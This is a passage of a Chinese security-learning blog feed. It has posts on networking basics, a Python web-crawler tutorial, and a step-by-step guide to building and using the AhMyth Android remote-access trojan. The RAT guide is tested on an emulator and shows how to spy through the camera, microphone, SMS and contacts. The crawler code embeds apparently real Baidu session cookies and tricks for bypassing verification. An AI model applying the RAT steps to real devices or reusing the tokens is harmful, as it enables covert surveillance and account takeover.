    <summary type="html">&lt;h4 id=&quot;一，Proxifier的使用&quot;&gt;&lt;a href=&quot;#一，Proxifier的使用&quot; class=&quot;headerlink&quot; title=&quot;一，Proxifier的使用&quot;&gt;&lt;/a&gt;一，Proxifier的使用&lt;/h4&gt;&lt;p&gt;​		Proxifier是一款功能非常强大的</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十三，网络基础</title>
    <link href="http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%B8%89%EF%BC%8C%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%B8%89%EF%BC%8C%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</id>
    <published>2023-12-04T11:54:11.000Z</published>
    <updated>2023-12-10T07:32:44.616Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，正向shell和反弹shell"><a href="#1，正向shell和反弹shell" class="headerlink" title="1，正向shell和反弹shell"></a>1，正向shell和反弹shell</h4><p>​正向shell是指攻击者在目标主机上成功安装了一个后门程序，使其能够通过网络与目标主机进行远程通信和控制。攻击者可以通过正向shell执行各种操作，如上传、下载、修改文件、执行命令等。</p><p>​反弹shell是指攻击者通过在目标主机上成功执行一个恶意代码，然后利用该恶意代码与自己的主机建立连接，从而实现对目标主机的远程控制。攻击者可以利用反弹shell执行各种攻击，如窃取敏感信息、操纵目标主机等。</p><p>示意图如下：<br><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312042011102.png" alt="image-20231204201149825" style="zoom:67%;" /></p><h4 id="2，ipv4的组成："><a href="#2，ipv4的组成：" class="headerlink" title="2，ipv4的组成："></a>2，ipv4的组成：</h4><p>网络部分（NETWORK）+主机部分（HOST）</p><p>比如：        192.168.1.142</p><p>网络部分为[192.168.1]    主机部分[142]</p><p>问：255.255.255.255&#x2F;30有多少个可分配的主机地址，分别是什么，其他的为什么不可用</p><p>答：对于IP地址块255.255.255.255&#x2F;30，它是一个包含4个连续IP地址的子网。</p><p>其中，两个IP地址是网络地址和广播地址，不能用于分配给主机。剩下的两个IP地址可用于分配给主机。</p><p>具体地，该子网的可分配的主机地址为：</p><pre><code>网络地址：255.255.255.252 (不可用)第一个可用主机地址：255.255.255.253第二个可用主机地址：255.255.255.254广播地址：255.255.255.255 (不可用)</code></pre><p>其中，网络地址和广播地址是保留地址，不能用于主机的分配。而第一个可用主机地址和第二个可用主机地址可以用于分配给主机使用。</p><p>需要注意的是，&#x2F;30 子网掩码只允许分配两个可用主机地址，因为它使用了30位来标识网络，只留下了2个位用于主机地址。</p><h4 id="3，公网地址和私网地址："><a href="#3，公网地址和私网地址：" class="headerlink" title="3，公网地址和私网地址："></a>3，公网地址和私网地址：</h4><p>公有网络地址分为A，B，C，D，E五类</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312042019152.png" alt="image-20231204201908897"></p><p>其中A，B，C三类为常用地址，D类地址用于组播通信的地址，E类地址用于科学研究的保留地址</p><p>私有网络地址分为A，B，C三类</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312042020772.png" alt="image-20231204202045734"></p><h4 id="4，OSI模型"><a href="#4，OSI模型" class="headerlink" title="4，OSI模型"></a>4，OSI模型</h4><p>​OSI（Open System Interconnect），即开放式系统互连。该体系结构标准定义了网络互连的七层框架</p><p>​OSI是逻辑模型，而非物理模型，它是一组指导原则，开发人员可据此来开发网络中运行的应用程序，它还提供了一个框架，可用于指导如何制作和实施网络标准，如何制造设备以及如何制定网络互联档案。</p><p>参考模型的优点：</p><ul><li>将网络通信过程划分成更小，更简单的组件，这有助于组件的开发，设计和故障排除。</li><li>通过标准化网络部件，让多家厂商能够协作开发。</li><li>明确定义了模型每层执行的功能，从而支持行业标准化。</li><li>让不同类型的网络硬件和软件能够彼此通信。</li><li>防止对一层的修改影响其他层，从而避免了开发工作的影响。</li></ul><p>OSI七层架构及各层作用：</p><p>物理层（Physical Layer）：负责传输比特流，并管理物理连接、电压等物理特性。<br>数据链路层（Data Link Layer）：在相邻节点之间传输数据帧，并提供错误检测和纠正的功能。<br>网络层（Network Layer）：负责在网络中选择路由并转发数据包，例如IP协议。<br>传输层（Transport Layer）：提供端到端的数据传输服务，并确保数据的可靠性和完整性，例如TCP协议。<br>会话层（Session Layer）：管理通信会话的建立、维护和终止。<br>表示层（Presentation Layer）：负责数据的格式化、加密和解密，以确保不同系统之间的数据交换。<br>应用层（Application Layer）：提供特定应用程序的服务，例如HTTP、FTP、SMTP等。</p><h4 id="5，路由器"><a href="#5，路由器" class="headerlink" title="5，路由器"></a>5，路由器</h4><p>路由器的定义：是实现网络互连设备，工作在网络层<br>路由器的功能：路由和转发<br>1）可以决定数据包从来源端到目的端所经过的路由路径（host到host之间的最佳传输路径），这个过程称为路由；<br>2）将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转发。<br>路由器和交换机的区别？<br>交换机是查看MAC地址表的，路由器是查看路由表的。交换机如果没有在MAC地址表中找到自己想要的，它就要进行区域泛洪，而路由器如果在路由表中找不到对应的条目会直接丢弃数据包，并返回一个不可到达的信息。他不会发送广播，所以路由器有隔离广播域的功能而交换机所在的网络内部就是一个广播域，他只在本区域泛洪，不会泛红到路由器外面；且交换机工作在二层，根据MAC地址表转发数据帧，路由器工作在三层，根据路由表转发数据包，交换机一般工作在据域网内，而路由器工作在广域网。</p><p>内网从路由器获取ip地址分为静态自动和动态（dhcp）手动两种<br>动态获取的ip在电脑关机时回收，下次启用时重新分发<br>当静动态都设为同一ip时，能不能上网和路由器的优先有关，一般时静态优先</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，正向shell和反弹shell&quot;&gt;&lt;a href=&quot;#1，正向shell和反弹shell&quot; class=&quot;headerlink&quot; title=&quot;1，正向shell和反弹shell&quot;&gt;&lt;/a&gt;1，正向shell和反弹shell&lt;/h4&gt;&lt;p&gt;​		正向shell</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十二，安卓手机远控AhMyth</title>
    <link href="http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%8C%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9C%E6%8E%A7AhMyth/"/>
    <id>http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%8C%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9C%E6%8E%A7AhMyth/</id>
    <published>2023-12-04T11:12:59.000Z</published>
    <updated>2023-12-04T11:47:00.739Z</updated>
    
    <content type="html"><![CDATA[<p>AhMyth是一款在GitHub上开源的能控制安卓手机的远程控制软件</p><p>项目地址为：<a href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a></p><p>接下来进行进行控制操作：</p><p>1，下载好AhMyth双击打开</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041921484.png" alt="image-20231204192128499" style="zoom:67%;" /><p>2，点击APK Builder—&gt;在Source IP中输入本机的IP地址—&gt;Source Port可以不用填，默认端口—&gt;点击Builder生成apk木马</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041929465.png" alt="image-20231204192953991" style="zoom:67%;" /><p>3，根据生成的地址找到apk木马</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041931824.png" alt="image-20231204193145510"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041933275.png" alt="image-20231204193317929"></p><p>4，在AhMyth中点击Victims，再点击Listen开启监听</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041936924.png" alt="image-20231204193640437" style="zoom:67%;" /><p>5，打开手机模拟器，将生成的Ahmyth.s.apk拖到模拟器中，双击运行，返回Ahmyth若出现以下效果，则证明远控成功</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041938350.png" alt="image-20231204193832219" style="zoom:67%;" /><p>6，点击Open The Lab可打开操作面板</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041939082.png" alt="image-20231204193948018" style="zoom:67%;" /><p>7，其中各个按钮皆有不同的功能</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312041945549.png" alt="image-20231204194534288" style="zoom:67%;" /><p>Camera:开启手机的前置或后置摄像头进行拍照</p><p>File Manager:文件管理器</p><p>Mic:可开启麦克风进行录音</p><p>Location:地址定位功能</p><p>contacts:通讯录</p><p>SMS:发送短信</p><p>Calls Logs:查看通话记录</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;AhMyth是一款在GitHub上开源的能控制安卓手机的远程控制软件&lt;/p&gt;
&lt;p&gt;项目地址为：&lt;a href=&quot;https://github.com/AhMyth/AhMyth-Android-RAT&quot;&gt;https://github.com/AhMyth/AhMyth-A</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十一，python爬虫基础</title>
    <link href="http://example.com/2023/12/03/%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%8Cpython%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/12/03/%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%8Cpython%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</id>
    <published>2023-12-03T03:15:18.000Z</published>
    <updated>2023-12-03T06:24:58.758Z</updated>
    
    <content type="html"><![CDATA[<h5 id="爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据"><a href="#爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据" class="headerlink" title="爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据"></a>爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据</h5><p>通过国内镜像地址下载urllib包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install urllib -i https://mirrors.huaweicloud.com/pypi/simple/</span><br></pre></td></tr></table></figure><h5 id="第一个爬虫程序："><a href="#第一个爬虫程序：" class="headerlink" title="第一个爬虫程序："></a>第一个爬虫程序：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入urllib包</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="comment"># 定义访问的地址</span></span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="comment"># 模拟浏览器向服务器发送请求，获取response响应</span></span><br><span class="line">response=urllib.request.urlopen(url)</span><br><span class="line"><span class="comment"># 获取响应中的页面源码，并设置utf-8编码</span></span><br><span class="line">connest=response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印页面源码</span></span><br><span class="line"><span class="built_in">print</span>(connest)</span><br></pre></td></tr></table></figure><h5 id="其中read方法可以用其他方法替换："><a href="#其中read方法可以用其他方法替换：" class="headerlink" title="其中read方法可以用其他方法替换："></a>其中read方法可以用其他方法替换：</h5><p>read()一个字节一个字节的读</p><p>readline()读取一行</p><p>readlines()读取所有行</p><p>getcode()获取状态码</p><p>geturl()获取URL地址</p><p>getheaders()获取状态信息</p><h5 id="urllib下载数据"><a href="#urllib下载数据" class="headerlink" title="urllib下载数据"></a>urllib下载数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url1=&quot;http://www.baidu.com&quot;</span><br><span class="line">urllib.request.urlretrieve(url1,&#x27;baidu.html&#x27;)</span><br></pre></td></tr></table></figure><p>其中url1可以设置页面，图片，视频的地址</p><h5 id="UA反爬"><a href="#UA反爬" class="headerlink" title="UA反爬"></a>UA反爬</h5><p>有些网页具有UA反爬设置，可以在程序中设置headers进行防反爬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">header=&#123;</span><br><span class="line">    &#x27;User-Agent&#x27;:&#x27; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span><br><span class="line">&#125;</span><br><span class="line">request=urllib.request.Request(url=url,headers=header)</span><br><span class="line">response=urllib.request.urlopen(request)</span><br><span class="line">conest=response.read().decode(&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>其中header的内容可以在浏览器中的控制台–&gt;Network–&gt;all–&gt;Name中选择数据–&gt;Headers–&gt;Request Headers</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312031133372.png" alt="image-20231203113331061"></p><h5 id="get请求的quote方法"><a href="#get请求的quote方法" class="headerlink" title="get请求的quote方法"></a>get请求的quote方法</h5><p>当get请求的参数是中文时，要将之转化为浏览器可以识别的参数，就需要用要quote方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=&#x27;https://www.baidu.com/s?wd=&#x27;</span><br><span class="line">name=urllib.parse.quote(&#x27;猫&#x27;)</span><br><span class="line">url=url+name</span><br></pre></td></tr></table></figure><h5 id="绕过百度安全验证"><a href="#绕过百度安全验证" class="headerlink" title="绕过百度安全验证"></a>绕过百度安全验证</h5><p>当用爬虫爬取百度搜索的数据时，可能会遇到百度安全验证的问题，可以在headers中设置User-Agent，Cookie和Accept来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36 Edg/83.0.478.50&#x27;,</span><br><span class="line">    &#x27;Cookie&#x27;:&#x27;BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; ZFY=EIjY8scX6onNHxN7L0gc:AlgR2fdPGOCkedx3Wllh2uw:C&#x27;,#自己先在浏览器登录百度账号</span><br><span class="line">    &#x27;Accept&#x27;:&#x27;image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h5><p>post请求与get请求方式不同，请求参数不是拼接的形式，要对请求参数进行处理，再定制请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">    &#x27;kw&#x27;:&#x27;so&#x27;</span><br><span class="line">&#125;</span><br><span class="line"># post请求的参数必须要进行编码</span><br><span class="line">data=urllib.parse.urlencode(data).encode(&#x27;utf-8&#x27;)</span><br><span class="line">request=urllib.request.Request(url=url,headers=header,data=data)</span><br></pre></td></tr></table></figure><h5 id="将str类型变为json对象"><a href="#将str类型变为json对象" class="headerlink" title="将str类型变为json对象"></a>将str类型变为json对象</h5><p>先导入json包，后使用loads方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obi=json.loads(contect)</span><br></pre></td></tr></table></figure><h5 id="get请求豆瓣电影，保存数据为json文件"><a href="#get请求豆瓣电影，保存数据为json文件" class="headerlink" title="get请求豆瓣电影，保存数据为json文件"></a>get请求豆瓣电影，保存数据为json文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Describe:get请求豆瓣电影，保存前10页数据</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_request</span>(<span class="params">page</span>):</span><br><span class="line">    base_url =<span class="string">&#x27;https://movie.douban.com/j/chart/top_list?type=24&amp;interval_id=100%3A90&amp;action=&amp;&#x27;</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;start&#x27;</span>:(page-<span class="number">1</span>)*<span class="number">20</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>:<span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=urllib.parse.urlencode(data)</span><br><span class="line">    url=base_url+data</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    header=&#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/javascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;BIDUPSID=4722B19FFA1551DBBC67EFB7A68BF304; PSTM=1654602249; REALTIME_TRANS_SWITCH=1; FANYI_WORD_SWITCH=1; HISTORY_SWITCH=1; SOUND_SPD_SWITCH=1; SOUND_PREFER_SWITCH=1; MCITY=-261%3A318%3A; BAIDUID=5F6D6603BD12746091D57F3B00271E14:FG=1; BDUSS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; APPGUIDE_10_6_5=1; APPGUIDE_10_6_6=1; APPGUIDE_10_6_7=1; newlogin=1; APPGUIDE_10_6_9=1; H_WISE_SIDS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_PS_PSSID=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; Hm_lvt_64ecd82404c51e03dc91cb9e8c025574=1701173106,1701241794,1701248955,1701307912; Hm_lpvt_64ecd82404c51e03dc91cb9e8c025574=1701307912; ab_sr=1.0.1_MjMxMmVhNDhhZjY3NDU1ODI4OWQ5MjlmZjZkN2VhN2M3MDJkYzdhMGE4OTFlOWY3Y2I0ZDhiZjViYmRhNDgyMjk4NGM5MTVkYzI4MTg1N2U3MTlhODI0MGZkYmFkOGQ3Y2Y4MGQ3ZDdhZjU3MTgwMTE2MzUyMWQ1YTNjOGUzZDI0NTY0MzJjZjFjMDhhOGUxMTYyODIwZDQ1NGE2MmRiNWY3OGRmNTQ4OWQ4ODM0NDk0NTI0NDhkZTRjNThkYTQ2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    request=urllib.request.Request(url=url,headers=header)</span><br><span class="line">    <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_contect</span>(<span class="params">request</span>):</span><br><span class="line">    response=urllib.request.urlopen(request)</span><br><span class="line">    contect=response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> contect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down_load</span>(<span class="params">page,contect</span>):</span><br><span class="line">    json_name=<span class="string">&#x27;./doban/doban&#x27;</span>+<span class="built_in">str</span>(page)+<span class="string">&#x27;.json&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(json_name,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(contect)</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_page=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请融入起始页：&quot;</span>))</span><br><span class="line">    end_page=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入结尾页：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span>(start_page&lt;<span class="number">1</span> <span class="keyword">or</span> end_page&lt;start_page):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入错误！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(start_page, end_page+<span class="number">1</span>):</span><br><span class="line">            request=get_request(page)</span><br><span class="line">            contect=get_contect(request)</span><br><span class="line">            down_load(page,contect)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;下载豆瓣电影名称&quot;</span>+<span class="built_in">str</span>(start_page)+<span class="string">&quot;~&quot;</span>+<span class="built_in">str</span>(end_page)+<span class="string">&quot;页完成！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第33行作用：当当前脚本被直接运行时，执行下面的代码块；当当前脚本被导入到其他脚本中时，不执行下面的代码块。这种写法通常用于确保某个模块或脚本在作为主程序运行时才执行某些操作，而在被导入时不执行这些操作。</p><p>第10行作用：将data中的属性值以&amp;连接起来</p><h5 id="post请求KFC，保存前10页数据"><a href="#post请求KFC，保存前10页数据" class="headerlink" title="post请求KFC，保存前10页数据"></a>post请求KFC，保存前10页数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># @Describe:post请求KFC，保存前10页数据</span><br><span class="line"></span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">def get_request(page):</span><br><span class="line">    url =&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=cname&#x27;</span><br><span class="line">    data=&#123;</span><br><span class="line">        &#x27;cname&#x27;: &#x27;北京&#x27;,</span><br><span class="line">        &#x27;pid&#x27;:&#x27;&#x27; ,</span><br><span class="line">        &#x27;pageIndex&#x27;: page,</span><br><span class="line">        &#x27;pageSize&#x27;: 10</span><br><span class="line">    &#125;</span><br><span class="line">    data=urllib.parse.urlencode(data).encode(&#x27;utf8&#x27;)</span><br><span class="line">    header=&#123;</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,</span><br><span class="line">    &#x27;Cookie&#x27;: &#x27;BIDUPSID=4722B19FFA1551DBBC67EFB7A68BF304; PSTM=1654602249; REALTIME_TRANS_SWITCH=1; FANYI_WORD_SWITCH=1; HISTORY_SWITCH=1; SOUND_SPD_SWITCH=1; SOUND_PREFER_SWITCH=1; MCITY=-261%3A318%3A; BAIDUID=5F6D6603BD12746091D57F3B00271E14:FG=1; BDUSS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; APPGUIDE_10_6_5=1; APPGUIDE_10_6_6=1; APPGUIDE_10_6_7=1; newlogin=1; APPGUIDE_10_6_9=1; H_WISE_SIDS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_PS_PSSID=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; Hm_lvt_64ecd82404c51e03dc91cb9e8c025574=1701173106,1701241794,1701248955,1701307912; Hm_lpvt_64ecd82404c51e03dc91cb9e8c025574=1701307912; ab_sr=1.0.1_MjMxMmVhNDhhZjY3NDU1ODI4OWQ5MjlmZjZkN2VhN2M3MDJkYzdhMGE4OTFlOWY3Y2I0ZDhiZjViYmRhNDgyMjk4NGM5MTVkYzI4MTg1N2U3MTlhODI0MGZkYmFkOGQ3Y2Y4MGQ3ZDdhZjU3MTgwMTE2MzUyMWQ1YTNjOGUzZDI0NTY0MzJjZjFjMDhhOGUxMTYyODIwZDQ1NGE2MmRiNWY3OGRmNTQ4OWQ4ODM0NDk0NTI0NDhkZTRjNThkYTQ2&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    request=urllib.request.Request(url=url,headers=header,data=data )</span><br><span class="line">    print(page)</span><br><span class="line">    return request</span><br><span class="line"></span><br><span class="line">def get_contect(request):</span><br><span class="line">    response=urllib.request.urlopen(request)</span><br><span class="line">    contect=response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">    return contect</span><br><span class="line"></span><br><span class="line">def down_load(page,contect):</span><br><span class="line">    json_name=&#x27;./kfc/kfc_&#x27;+str(page)+&#x27;.json&#x27;</span><br><span class="line">    with 